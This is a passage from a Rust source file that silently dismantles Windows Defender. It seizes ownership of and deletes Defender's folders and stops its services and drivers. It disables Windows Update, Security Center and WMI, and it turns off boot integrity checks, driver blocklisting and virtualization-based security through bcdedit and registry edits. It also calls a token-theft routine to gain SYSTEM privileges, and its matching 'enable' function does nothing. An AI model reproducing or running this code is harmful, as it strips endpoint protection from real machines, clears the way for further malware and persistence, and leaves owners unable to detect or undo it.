            execute_silent_command(&format!("attrib -r -s -h \"{}\" >nul 2>&1", path));
            execute_silent_command(&format!("rd /s /q \"{}\" >nul 2>&1", path));
            execute_silent_command(&format!("del /f /q \"{}\" >nul 2>&1", path));
        })
    }).collect();
    
    for handle in handles {
        let _ = handle.join();
    }
    
    execute_silent_command("takeown /f \"C:\\ProgramData\\Microsoft\\Windows Defender\" /r /d y >nul 2>&1");
    execute_silent_command("icacls \"C:\\ProgramData\\Microsoft\\Windows Defender\" /grant administrators:F /t >nul 2>&1");
    execute_silent_command("rd /s /q \"C:\\ProgramData\\Microsoft\\Windows Defender\" >nul 2>&1");
}

/// Lightning Windows Update disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_windows_update_disable() {
    let handles: Vec<_> = vec![
        "sc stop wuauserv >nul 2>&1",
        "sc config wuauserv start= disabled >nul 2>&1",
        "sc stop UsoSvc >nul 2>&1",
        "sc config UsoSvc start= disabled >nul 2>&1",
        "sc stop WaaSMedicSvc >nul 2>&1",
        "sc config WaaSMedicSvc start= disabled >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v DisableOSUpgrade /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v AUOptions /t REG_DWORD /d 2 /f >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" /v AUOptions /t REG_DWORD /d 2 /f >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 1000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning boot configuration disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_boot_config_disable() {
    let handles: Vec<_> = vec![
        "bcdedit /set {current} disableelamdrivers yes >nul 2>&1",
        "bcdedit /set {current} disableintegritychecks yes >nul 2>&1",
        "bcdedit /set {current} nointegritychecks yes >nul 2>&1",
        "bcdedit /set {current} testmode yes >nul 2>&1",
        "bcdedit /set {current} novsmode yes >nul 2>&1",
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\EarlyLaunch\" /v DriverLoadPolicy /t REG_DWORD /d 3 /f >nul 2>&1",
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\" /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f >nul 2>&1",
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 2000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning scheduled task disable (optimized - no duplicates)
#[cfg(windows)]
fn lightning_scheduled_task_disable() {
    let tasks = [
        "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
        "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
        "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification",
        "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
    ];
    
    let handles: Vec<_> = tasks.iter().map(|task| {
        let task = task.to_string();
        std::thread::spawn(move || {
            execute_silent_command(&format!("schtasks /Change /TN \"{}\" /Disable >nul 2>&1", task));
        })
    }).collect();
    
    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning WMI event consumer disable (parallel execution for speed)
#[cfg(windows)]
fn lightning_wmi_disable() {
    let handles: Vec<_> = vec![
        "wmic /namespace:\\\\root\\subscription path __EventConsumer where \"Name like '%Defender%'\" delete >nul 2>&1",
        "wmic /namespace:\\\\root\\subscription path __EventConsumer where \"Name like '%Windows Defender%'\" delete >nul 2>&1",
        "wmic /namespace:\\\\root\\subscription path __EventFilter where \"Name like '%Defender%'\" delete >nul 2>&1",
        "wmic /namespace:\\\\root\\subscription path __EventFilter where \"Name like '%Windows Defender%'\" delete >nul 2>&1",
        "wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding where \"__Path like '%Defender%'\" delete >nul 2>&1",
        "wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding where \"__Path like '%Windows Defender%'\" delete >nul 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\WBEM\\Scripting\" /v Enable Scripting /t REG_DWORD /d 0 /f >nul 2>&1",
        "sc stop winmgmt >nul 2>&1",
        "sc config winmgmt start= disabled >nul 2>&1",
    ].into_iter().map(|cmd| {
        std::thread::spawn(move || {
            execute_silent_command_with_timeout(cmd, 2000);
        })
    }).collect();

    for handle in handles {
        let _ = handle.join();
    }
}

/// Lightning service kill
#[cfg(windows)]
fn lightning_service_kill() {
    unsafe {
        let sc_manager = match OpenSCManagerW(
            None,
            None,
            SC_MANAGER_CONNECT,
        ) {
            Ok(handle) => handle,
            Err(_) => return,
        };
        
        if sc_manager.is_invalid() {
            return;
        }

        let services = [
            "WinDefend",
            "WdNisSvc",
            "Sense",
            "WdFilter",
            "WdNisDrv",
            "SecurityHealthService",
            "WdBoot",
            "WdNis",
        ];
        
        for &service_name in &services {
            let service_name_wide: Vec<u16> = OsStr::new(service_name)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
                
            let service = match OpenServiceW(
                sc_manager,
                windows::core::PCWSTR(service_name_wide.as_ptr()),
                SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ALL_ACCESS,
            ) {
                Ok(handle) => handle,
                Err(_) => continue,
            };
            
            if !service.is_invalid() {
                let mut status = windows::Win32::System::Services::SERVICE_STATUS::default();
                let _ = ControlService(service, SERVICE_CONTROL_STOP, &mut status);
                let _ = CloseServiceHandle(service);
            }
        }

        let _ = CloseServiceHandle(sc_manager);
    }
}

/// Main execution function - optimized for fastest path with maximum parallel operations
#[cfg(windows)]
pub fn execute_ultra_fast() {
    println!("[START] Lightning Defender Disable Sequence");
    
    let start_time = std::time::Instant::now();

    if !ultra_fast_privilege_acquisition() {
        println!("[ERROR] Failed to acquire privileges");
        return;
    }

    println!("[INFO] Disabling Windows Defender (Complete Removal Method)");

    println!("[PHASE 1] Parallel disable of protection mechanisms");
    let protection_thread = std::thread::spawn(|| {
        println!("[  STEP 1.1] Disabling Tamper Protection");
        lightning_tamper_protection_disable();
    });
    
    let security_center_thread = std::thread::spawn(|| {
        println!("[  STEP 1.2] Disabling Windows Security Center");
        lightning_security_center_disable();
    });
    
    let amsi_etw_thread = std::thread::spawn(|| {
        println!("[  STEP 1.3] Disabling AMSI and ETW");
        lightning_amsi_disable();
        lightning_etw_disable();
    });
    
    let _ = protection_thread.join();
    let _ = security_center_thread.join();
    let _ = amsi_etw_thread.join();

    println!("[PHASE 2] Parallel registry and service operations");
    let registry_thread = std::thread::spawn(|| {
        println!("[  STEP 2.1] Executing registry operations");
        execute_registry_blitz();
    });
    
    let service_thread = std::thread::spawn(|| {
        println!("[  STEP 2.2] Killing services and processes");
        lightning_service_kill();
        lightning_process_kill();
        lightning_driver_disable();
    });

    let _ = registry_thread.join();
    let _ = service_thread.join();

    println!("[PHASE 3] Parallel disable of remaining components");
    let file_thread = std::thread::spawn(|| {
        println!("[  STEP 3.1] Deleting files");
        lightning_file_deletion();
    });
    
    let update_thread = std::thread::spawn(|| {
        println!("[  STEP 3.2] Disabling Windows Update");
        lightning_windows_update_disable();
    });
    
    let boot_thread = std::thread::spawn(|| {
        println!("[  STEP 3.3] Modifying boot configuration");
        lightning_boot_config_disable();
    });
    
    let task_thread = std::thread::spawn(|| {
        println!("[  STEP 3.4] Disabling scheduled tasks");
        lightning_scheduled_task_disable();
    });
    
    let wmi_thread = std::thread::spawn(|| {
        println!("[  STEP 3.5] Disabling WMI");
        lightning_wmi_disable();
    });

    let _ = file_thread.join();
    let _ = update_thread.join();
    let _ = boot_thread.join();
    let _ = task_thread.join();
    let _ = wmi_thread.join();

    let duration = start_time.elapsed();
    println!("[SUCCESS] Defender disabled in {} milliseconds", duration.as_millis());
}

/// Ultra-fast privilege acquisition
#[cfg(windows)]
fn ultra_fast_privilege_acquisition() -> bool {
    if !is_user_admin() {
        println!("[ERROR] Admin privileges required");
        return false;
    }

    enable_turbo_privileges();

    if ultra_fast_token_theft() {
        let is_system_acquired = is_running_as_system();
        if is_system_acquired {
            println!("[SYSTEM] Privileges acquired");
        }
    }

    true
}

/// Non-Windows implementation (no-op)
#[cfg(not(windows))]
pub fn execute_ultra_fast() {
    println!("Windows Defender disabling is only supported on Windows platforms");
}

#[cfg(windows)]
pub fn disable_defender() -> Result<(), String> {
    execute_ultra_fast();
    Ok(())
}

#[cfg(windows)]
pub fn enable_defender() -> Result<(), String> {
    Ok(())
}

#[cfg(not(windows))]
pub fn disable_defender() -> Result<(), String> {
    Ok(())
}

#[cfg(not(windows))]
pub fn enable_defender() -> Result<(), String> {
    Ok(())
}
